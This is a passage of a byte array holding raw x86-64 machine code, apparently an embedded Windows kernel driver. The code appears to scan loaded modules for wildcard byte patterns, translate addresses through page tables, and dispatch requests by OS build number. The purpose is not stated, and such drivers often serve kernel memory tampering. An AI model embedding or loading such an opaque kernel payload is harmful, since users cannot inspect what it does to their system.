    0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x45, 0x31, 0xC9, 0xE8, 0xBE, 0x63,
    0x00, 0x00, 0x85, 0xC0, 0x78, 0x8A, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xA8, 0x01, 0x74, 0x81, 0x84,
    0xC0, 0x0F, 0x88, 0xDD, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
    0x4C, 0x21, 0xE8, 0x89, 0xE9, 0xC1, 0xE9, 0x12, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09,
    0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x45, 0x31, 0xC9, 0xE8,
    0x7C, 0x63, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x44, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24,
    0x38, 0xA8, 0x01, 0x0F, 0x84, 0x37, 0xFF, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x88, 0xEA, 0x00, 0x00,
    0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x21, 0xE8, 0x89, 0xE9, 0xC1,
    0xE9, 0x09, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x45, 0x31, 0xC9, 0xE8, 0x32, 0x63, 0x00, 0x00, 0x85, 0xC0,
    0x0F, 0x88, 0xFA, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xF6, 0xC1, 0x01, 0x0F, 0x84,
    0xEC, 0xFE, 0xFF, 0xFF, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00,
    0x00, 0x00, 0x48, 0x21, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x50, 0x8B, 0x15, 0xE8, 0xC5, 0x00, 0x00,
    0x45, 0x31, 0xC0, 0xE8, 0xC8, 0x40, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x50, 0x4C, 0x8B, 0x15,
    0x64, 0xC8, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0xBC, 0x00, 0x00, 0x00, 0x48, 0x89, 0x6C, 0x24,
    0x20, 0x48, 0x8D, 0x0D, 0x60, 0x89, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x75, 0xB3, 0x00, 0x00, 0xE9,
    0xB7, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00,
    0x00, 0x00, 0x48, 0x21, 0xC8, 0x89, 0xEB, 0xC1, 0xEB, 0x0C, 0x81, 0xE3, 0xFF, 0xFF, 0x03, 0x00,
    0x48, 0x01, 0xC3, 0x8B, 0x15, 0x8F, 0xC5, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x45, 0x31, 0xC0, 0xE8,
    0x6C, 0x40, 0x00, 0x00, 0x4C, 0x8B, 0x15, 0x0D, 0xC8, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x30,
    0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x6C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xC4, 0x89, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x1E, 0xB3, 0x00, 0x00, 0xE9, 0x2B, 0xFE, 0xFF, 0xFF, 0x48, 0xC1, 0xE8, 0x0C, 0x48,
    0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x89, 0xEB, 0xC1, 0xEB,
    0x0C, 0x81, 0xE3, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x01, 0xC3, 0x8B, 0x15, 0x38, 0xC5, 0x00, 0x00,
    0x48, 0x89, 0xD9, 0x45, 0x31, 0xC0, 0xE8, 0x15, 0x40, 0x00, 0x00, 0x4C, 0x8B, 0x15, 0xB6, 0xC7,
    0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0xD9, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x6C, 0x24, 0x20, 0x48,
    0x8D, 0x0D, 0x28, 0x89, 0x00, 0x00, 0xEB, 0xA7, 0x48, 0x89, 0x6C, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0xDB, 0x88, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC9, 0xB2, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD4, 0x99,
    0x00, 0x00, 0x41, 0xFF, 0xD2, 0x49, 0xFF, 0xC7, 0xE9, 0xD3, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC,
    0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x81, 0xEC, 0xE8, 0x03, 0x00, 0x00, 0xBE, 0xEF, 0x00, 0x00,
    0xC0, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x11, 0x01, 0x00, 0x00, 0x48, 0x89, 0xD7, 0x48, 0x85, 0xD2,
    0x0F, 0x84, 0x05, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xC3, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xF9, 0x00,
    0x00, 0x00, 0x49, 0x89, 0xCE, 0x48, 0x8D, 0x4C, 0x24, 0x48, 0x41, 0xB8, 0xA0, 0x03, 0x00, 0x00,
    0x31, 0xD2, 0xE8, 0x39, 0xF0, 0xFF, 0xFF, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x41, 0xFF, 0xD6, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9D, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x40, 0x48, 0x89, 0x4C, 0x24, 0x30, 0xC6, 0x44, 0x24, 0x28, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20,
    0xA0, 0x03, 0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x48, 0x48, 0x89, 0xC1, 0x48, 0x89, 0xDA, 0x49,
    0x89, 0xC0, 0xFF, 0xD7, 0xBE, 0xF2, 0x00, 0x00, 0xC0, 0x85, 0xC0, 0x0F, 0x88, 0x9A, 0x00, 0x00,
    0x00, 0x48, 0x81, 0x7C, 0x24, 0x40, 0xA0, 0x03, 0x00, 0x00, 0x0F, 0x85, 0x8B, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x4C, 0x24, 0x48, 0xE8, 0x76, 0xF4, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x52, 0x48, 0x8B,
    0x15, 0x4B, 0xC4, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x3C, 0xC4, 0x00, 0x00, 0xE8, 0x0F, 0xFC, 0xFF,
    0xFF, 0x85, 0xC0, 0x78, 0x46, 0x48, 0x8D, 0x0D, 0x94, 0x00, 0x00, 0x00, 0xE8, 0x6F, 0xF0, 0xFF,
    0xFF, 0x89, 0xC6, 0x48, 0x8B, 0x05, 0x9E, 0xC6, 0x00, 0x00, 0x85, 0xF6, 0x78, 0x5C, 0x48, 0x8D,
    0x0D, 0xE1, 0x82, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB8, 0xB1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x02,
    0x82, 0x00, 0x00, 0xFF, 0xD0, 0x31, 0xF6, 0xEB, 0x32, 0xBE, 0xF1, 0x00, 0x00, 0xC0, 0xEB, 0x2B,
    0x89, 0xC6, 0x48, 0x8D, 0x0D, 0xCC, 0xAF, 0x00, 0x00, 0xEB, 0x09, 0x89, 0xC6, 0x48, 0x8D, 0x0D,
    0x06, 0xB0, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x83, 0xB1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD3, 0x81,
    0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0x4D, 0xC6, 0x00, 0x00, 0x89, 0xF0, 0x48, 0x81, 0xC4,
    0xE8, 0x03, 0x00, 0x00, 0x5B, 0x5F, 0x5E, 0x41, 0x5E, 0xC3, 0x48, 0x8D, 0x0D, 0x1A, 0xB0, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x56, 0xB1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xA6, 0x81, 0x00, 0x00, 0x41,
    0x89, 0xF1, 0xFF, 0xD0, 0xEB, 0xD5, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xCF, 0x65, 0x48, 0x8B, 0x04,
    0x25, 0x88, 0x01, 0x00, 0x00, 0x80, 0xB8, 0x32, 0x02, 0x00, 0x00, 0x01, 0x0F, 0x85, 0x81, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x7C, 0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x41,
    0xB8, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x06, 0x3E, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x65, 0x48, 0x8D,
    0x0D, 0xDB, 0xC6, 0x00, 0x00, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xE8, 0x8D,
    0x3D, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x4C, 0x81, 0x3D, 0xBF, 0xC6, 0x00, 0x00, 0x2B, 0x09, 0x00,
    0x00, 0x75, 0x40, 0x8B, 0x05, 0xBB, 0xC6, 0x00, 0x00, 0x3D, 0x3B, 0x09, 0x00, 0x00, 0x7E, 0x49,
    0x3D, 0x2B, 0x10, 0x00, 0x00, 0x7E, 0x62, 0x3D, 0x2C, 0x10, 0x00, 0x00, 0x0F, 0x84, 0x89, 0x00,
    0x00, 0x00, 0x3D, 0x3C, 0x10, 0x00, 0x00, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x3D, 0x4C, 0x10,
    0x00, 0x00, 0x0F, 0x85, 0xAF, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0xDD,
    0x07, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xCE, 0xC2, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x48, 0x89, 0xF2,
    0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0x48, 0xFF, 0xE0, 0x3D, 0x38, 0x01, 0x00, 0x00, 0x7F, 0x32,
    0x3D, 0x19, 0x01, 0x00, 0x00, 0x74, 0x5C, 0x3D, 0x29, 0x01, 0x00, 0x00, 0x75, 0x79, 0x48, 0x83,
    0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0x37, 0x05, 0x00, 0x00, 0x3D, 0x3C, 0x09, 0x00, 0x00, 0x74, 0x4F,
    0x3D, 0x1C, 0x10, 0x00, 0x00, 0x75, 0x60, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0xFE, 0x07,
    0x00, 0x00, 0x3D, 0x39, 0x01, 0x00, 0x00, 0x74, 0x42, 0x3D, 0x79, 0x01, 0x00, 0x00, 0x75, 0x47,
    0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0x55, 0x06, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28,
    0x5F, 0x5E, 0xE9, 0x69, 0x09, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0xDD,
    0x06, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0x11, 0x03, 0x00, 0x00, 0x90,
    0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xE9, 0x65, 0x11, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28,
    0x5F, 0x5E, 0xE9, 0x79, 0x03, 0x00, 0x00, 0x48, 0x85, 0xF6, 0x74, 0x07, 0x48, 0xC7, 0x06, 0x02,
    0x00, 0x00, 0xC0, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x85,
    0xD2, 0x0F, 0x84, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD6, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0x4C,
    0x89, 0xC2, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x31, 0xFF, 0x48, 0x85,
    0xC9, 0x0F, 0x84, 0xE7, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC0, 0x0F,
    0x84, 0xD9, 0x00, 0x00, 0x00, 0x4C, 0x63, 0x46, 0x3C, 0x41, 0x0F, 0xB7, 0x54, 0x30, 0x06, 0x48,
    0x85, 0xD2, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x45, 0x0F, 0xB7, 0x4C, 0x30, 0x14, 0x49, 0x01,
    0xF0, 0x4D, 0x01, 0xC8, 0x49, 0x83, 0xC0, 0x18, 0x4C, 0x8B, 0x4C, 0x24, 0x38, 0x41, 0xBA, 0x00,
    0x00, 0x00, 0x22, 0x45, 0x31, 0xDB, 0xEB, 0x10, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xFF, 0xC3, 0x49, 0x39, 0xD3, 0x74, 0x63, 0x4B, 0x8D, 0x3C, 0x9B, 0x41, 0x8B, 0x5C, 0xF8,
    0x24, 0x44, 0x21, 0xD3, 0x81, 0xFB, 0x00, 0x00, 0x00, 0x20, 0x75, 0xE4, 0x45, 0x8B, 0x74, 0xF8,
    0x08, 0x4D, 0x29, 0xCE, 0x72, 0xDA, 0x41, 0x8B, 0x7C, 0xF8, 0x0C, 0x48, 0x01, 0xF7, 0x49, 0x89,
    0xFF, 0x31, 0xDB, 0x4D, 0x85, 0xC9, 0x74, 0x4C, 0x45, 0x31, 0xE4, 0xEB, 0x0B, 0x0F, 0x1F, 0x00,
    0x49, 0xFF, 0xC4, 0x4D, 0x39, 0xE1, 0x74, 0x3E, 0x42, 0x80, 0x3C, 0x20, 0x00, 0x74, 0xF1, 0x43,
    0x0F, 0xB6, 0x2C, 0x27, 0x42, 0x3A, 0x2C, 0x21, 0x74, 0xE6, 0x48, 0xFF, 0xC3, 0x49, 0xFF, 0xC7,
    0x4C, 0x39, 0xF3, 0x76, 0xCE, 0xEB, 0x99, 0x31, 0xFF, 0xEB, 0x33, 0x31, 0xFF, 0x31, 0xD2, 0xFF,
    0x15, 0xF3, 0xC2, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x31, 0xD2, 0xFF, 0x15, 0xE6, 0xC2,
    0x00, 0x00, 0xEB, 0x1A, 0x31, 0xDB, 0x31, 0xD2, 0xFF, 0x15, 0xDA, 0xC2, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0x31, 0xD2, 0xFF, 0x15, 0xCD, 0xC2, 0x00, 0x00, 0x48, 0x01, 0xDF, 0x48, 0x89,
    0xF8, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5E, 0x41, 0x5F, 0xC3,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD7, 0x48, 0x89,
    0xCE, 0x48, 0xC7, 0x41, 0x10, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xFF, 0x15, 0x8E, 0xC3,
    0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x85, 0xC0, 0x74, 0x2D, 0x31, 0xC0, 0x45, 0x31, 0xF6, 0x90,
    0x0F, 0xB6, 0x0C, 0x07, 0x31, 0xD2, 0x80, 0xF9, 0x20, 0x0F, 0x95, 0xC2, 0x80, 0xF9, 0x3F, 0x0F,
    0x95, 0xC1, 0x49, 0x01, 0xD6, 0x20, 0xCA, 0x0F, 0xB6, 0xCA, 0x48, 0x01, 0xC8, 0x48, 0xFF, 0xC0,
    0x48, 0x39, 0xD8, 0x72, 0xDB, 0xEB, 0x03, 0x45, 0x31, 0xF6, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xF2, 0x41, 0xB8, 0x70, 0x74, 0x72, 0x6E, 0xFF, 0x15, 0x42, 0xC2, 0x00, 0x00, 0x49, 0x89,
    0xC7, 0x48, 0x89, 0x06, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x41, 0xB8, 0x6D, 0x61,
    0x73, 0x6B, 0xFF, 0x15, 0x28, 0xC2, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x48, 0x89, 0x46, 0x08, 0x4D,
    0x85, 0xFF, 0x0F, 0x84, 0xD7, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0xCE, 0x00, 0x00,
    0x00, 0x31, 0xC0, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0xE5, 0x00, 0x00, 0x00, 0x31, 0xD2, 0x31, 0xC9,
    0xEB, 0x38, 0x45, 0x8D, 0x51, 0xBF, 0x41, 0x80, 0xC1, 0xC9, 0x41, 0x80, 0xFA, 0x06, 0x45, 0x0F,
    0xB6, 0xD1, 0x44, 0x0F, 0x43, 0xD0, 0x41, 0xC0, 0xE0, 0x04, 0x45, 0x08, 0xD0, 0x48, 0xFF, 0xC2,
    0x41, 0xB1, 0x01, 0x45, 0x88, 0x04, 0x0F, 0x45, 0x88, 0x0C, 0x0E, 0x48, 0xFF, 0xC1, 0x48, 0xFF,
    0xC2, 0x48, 0x39, 0xDA, 0x0F, 0x83, 0xA9, 0x00, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0x0C, 0x17, 0x41,
    0x83, 0xF9, 0x20, 0x74, 0xE9, 0x41, 0x83, 0xF9, 0x3F, 0x75, 0x15, 0x45, 0x31, 0xC0, 0x45, 0x31,
    0xC9, 0xEB, 0xD0, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x8D, 0x41, 0xD0, 0x41, 0x80, 0xF8, 0x0A, 0x72, 0x27, 0x45, 0x8D, 0x41, 0x9F, 0x41, 0x80,
    0xF8, 0x05, 0x77, 0x09, 0x41, 0x80, 0xC1, 0xA9, 0x45, 0x89, 0xC8, 0xEB, 0x14, 0x45, 0x8D, 0x41,
    0xBF, 0x41, 0x80, 0xC1, 0xC9, 0x41, 0x80, 0xF8, 0x06, 0x45, 0x0F, 0xB6, 0xC1, 0x44, 0x0F, 0x43,
    0xC0, 0x44, 0x0F, 0xB6, 0x4C, 0x17, 0x01, 0x45, 0x8D, 0x51, 0xD0, 0x41, 0x80, 0xFA, 0x0A, 0x0F,
    0x82, 0x71, 0xFF, 0xFF, 0xFF, 0x45, 0x8D, 0x51, 0x9F, 0x41, 0x80, 0xFA, 0x05, 0x0F, 0x87, 0x4F,
    0xFF, 0xFF, 0xFF, 0x41, 0x80, 0xC1, 0xA9, 0x45, 0x89, 0xCA, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x4D,
    0x85, 0xFF, 0x74, 0x0B, 0x4C, 0x89, 0xF9, 0x31, 0xD2, 0xFF, 0x15, 0x39, 0xC1, 0x00, 0x00, 0x4D,
    0x85, 0xF6, 0x74, 0x13, 0x4C, 0x89, 0xF1, 0x31, 0xD2, 0xFF, 0x15, 0x29, 0xC1, 0x00, 0x00, 0xEB,
    0x06, 0x31, 0xC9, 0x48, 0x89, 0x4E, 0x10, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F,
    0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x81, 0xEC, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xE4, 0xA4, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0xEF, 0xAC, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE8, 0x8D, 0x00, 0x00, 0xFF, 0x15, 0xB6, 0xC1,
    0x00, 0x00, 0x48, 0x8B, 0x15, 0xBF, 0xC2, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xB8,
    0x18, 0x02, 0x00, 0x00, 0xE8, 0x67, 0x39, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x2A, 0x8B, 0x4C, 0x24,
    0x20, 0x48, 0x85, 0xC9, 0x74, 0x21, 0x48, 0x8D, 0x54, 0x24, 0x30, 0xE8, 0x10, 0x6B, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x74, 0x12, 0x48, 0x8B, 0x0D, 0x8C, 0xC2, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08,
    0xB8, 0x1A, 0x09, 0x00, 0x00, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0x38, 0x02, 0x00, 0x00,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8B, 0x15, 0x56, 0xC2,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00, 0xE8, 0xFE, 0x38,
    0x00, 0x00, 0x31, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0x0C, 0x01, 0x00, 0x00, 0x48, 0x83, 0x7C, 0x24,
    0x40, 0x00, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x38, 0x85, 0xC9, 0x0F, 0x84,
    0xF4, 0x00, 0x00, 0x00, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x0F, 0x84, 0xE8, 0x00, 0x00, 0x00,
    0x48, 0x83, 0x7C, 0x24, 0x50, 0x00, 0x0F, 0x84, 0xDC, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
    0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAD,
    0xBF, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0x31, 0xFF, 0xE9, 0xBA, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x74, 0x24, 0x30, 0x48, 0x85, 0xF6, 0x74, 0x27, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0xE5, 0x97, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEE, 0xAB, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9A, 0x9C,
    0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x96, 0x8D, 0x00, 0x00, 0xFF, 0x15, 0xA9, 0xC0, 0x00, 0x00, 0x80,
    0x3D, 0x4A, 0xC1, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7C, 0x24, 0x50, 0x48, 0x8B, 0x5C, 0x24, 0x40,
    0x4C, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8D, 0x05, 0x14, 0xC1, 0x00, 0x00, 0x48, 0x0F, 0x44, 0xC7,
    0x48, 0x8B, 0x38, 0xFF, 0x15, 0x8F, 0xBF, 0x00, 0x00, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x89,
    0xC1, 0x4C, 0x89, 0xF2, 0x49, 0x89, 0xF8, 0x49, 0x89, 0xD9, 0xE8, 0x41, 0x62, 0x00, 0x00, 0x85,
    0xC0, 0x78, 0x54, 0x48, 0x8B, 0x05, 0x6E, 0xC1, 0x00, 0x00, 0xC6, 0x40, 0x20, 0x01, 0xBF, 0x1A,
    0x09, 0x00, 0x00, 0x48, 0x85, 0xF6, 0x74, 0x30, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0x2F, 0x97, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6E, 0xAB, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x19, 0x9C,
    0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x16, 0x8D, 0x00, 0x00, 0xFF, 0x15, 0x29, 0xC0, 0x00, 0x00, 0x48,
    0x89, 0xF1, 0xFF, 0x15, 0x38, 0xBF, 0x00, 0x00, 0x48, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x60, 0x5B,
    0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x31, 0xFF, 0x48, 0x85, 0xF6, 0x75, 0xBA, 0xEB, 0xE8,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8B, 0x15, 0x06, 0xC1,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00, 0xE8, 0xAE, 0x37,
    0x00, 0x00, 0x31, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0x06, 0x01, 0x00, 0x00, 0x48, 0x83, 0x7C, 0x24,
    0x40, 0x00, 0x0F, 0x84, 0xFA, 0x00, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x38, 0x85, 0xC9, 0x0F, 0x84,
    0xEE, 0x00, 0x00, 0x00, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x0F, 0x84, 0xE2, 0x00, 0x00, 0x00,
    0x48, 0x83, 0x7C, 0x24, 0x50, 0x00, 0x0F, 0x84, 0xD6, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
    0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0x5D,
    0xBE, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0x31, 0xFF, 0xE9, 0xB4, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x74, 0x24, 0x30, 0x48, 0x85, 0xF6, 0x74, 0x27, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0x95, 0x96, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x9E, 0xAA, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4A, 0x9B,
    0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x46, 0x8C, 0x00, 0x00, 0xFF, 0x15, 0x59, 0xBF, 0x00, 0x00, 0x80,
    0x3D, 0xFA, 0xBF, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x4C, 0x8B, 0x74, 0x24, 0x50,
    0x4C, 0x8D, 0x3D, 0xC9, 0xBF, 0x00, 0x00, 0x4C, 0x0F, 0x44, 0xFF, 0xFF, 0x15, 0x47, 0xBE, 0x00,
    0x00, 0x48, 0x8B, 0x54, 0x24, 0x40, 0x49, 0x8B, 0x0F, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x49, 0x89,
    0xC0, 0x49, 0x89, 0xD9, 0xE8, 0xF7, 0x60, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x54, 0x48, 0x8B, 0x05,
    0x24, 0xC0, 0x00, 0x00, 0xC6, 0x40, 0x20, 0x01, 0xBF, 0x1A, 0x09, 0x00, 0x00, 0x48, 0x85, 0xF6,
    0x74, 0x30, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xE5, 0x95, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x24, 0xAA, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xCF, 0x9A, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0xCC,
    0x8B, 0x00, 0x00, 0xFF, 0x15, 0xDF, 0xBE, 0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0xEE, 0xBD,
    0x00, 0x00, 0x48, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F,
    0xC3, 0x31, 0xFF, 0x48, 0x85, 0xF6, 0x75, 0xBA, 0xEB, 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x81, 0xEC, 0x48, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xA1, 0xA1, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0xCF, 0xA9, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB1, 0x8A, 0x00, 0x00, 0xFF, 0x15, 0x96, 0xBE,
